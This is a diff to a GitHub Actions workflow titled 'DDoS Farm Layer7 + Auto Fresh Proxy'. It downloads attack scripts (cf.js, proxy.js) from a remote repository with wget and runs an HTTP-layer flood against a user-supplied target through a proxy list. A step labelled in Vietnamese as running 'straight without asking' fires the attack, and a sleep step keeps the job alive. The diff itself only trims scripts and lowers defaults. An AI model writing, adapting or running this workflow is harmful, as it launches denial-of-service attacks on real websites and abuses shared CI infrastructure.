@@ -3,18 +3,14 @@ name: DDoS Farm Layer7 + Auto Fresh Proxy
 on:
   workflow_dispatch:
     inputs:
-      method:
-        default: '2'
-        type: choice
-        options: ['1','2','3','4']
       target:
         required: true
       time:
-        default: '1800'
+        default: '300'
       threads:
-        default: '128'
+        default: '30'
       rate:
-        default: '256'
+        default: '90'
 
 jobs:
   attack:
@@ -29,9 +25,6 @@ jobs:
       - name: Download tools
         run: |
           wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/cf.js
-          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/captcha.js
-          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/uam.js
-          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/run.py
           wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/proxy.js
           chmod +x *
 
@@ -41,7 +34,7 @@ jobs:
 
       - name: Bắn Layer7 (CHẠY THẲNG KHÔNG HỎI)
         run: |
-          python3 run.py 2 1 ${{ inputs.method }} ${{ inputs.target }} ${{ inputs.time }} ${{ inputs.threads }} ${{ inputs.rate }} proxy.txt
+          node cf.js ${{ inputs.target }} ${{ inputs.time }} ${{ inputs.threads }} ${{ inputs.rate }} proxy.txt --full --cache --debug
 
       - name: Keep alive
         run: sleep 21600
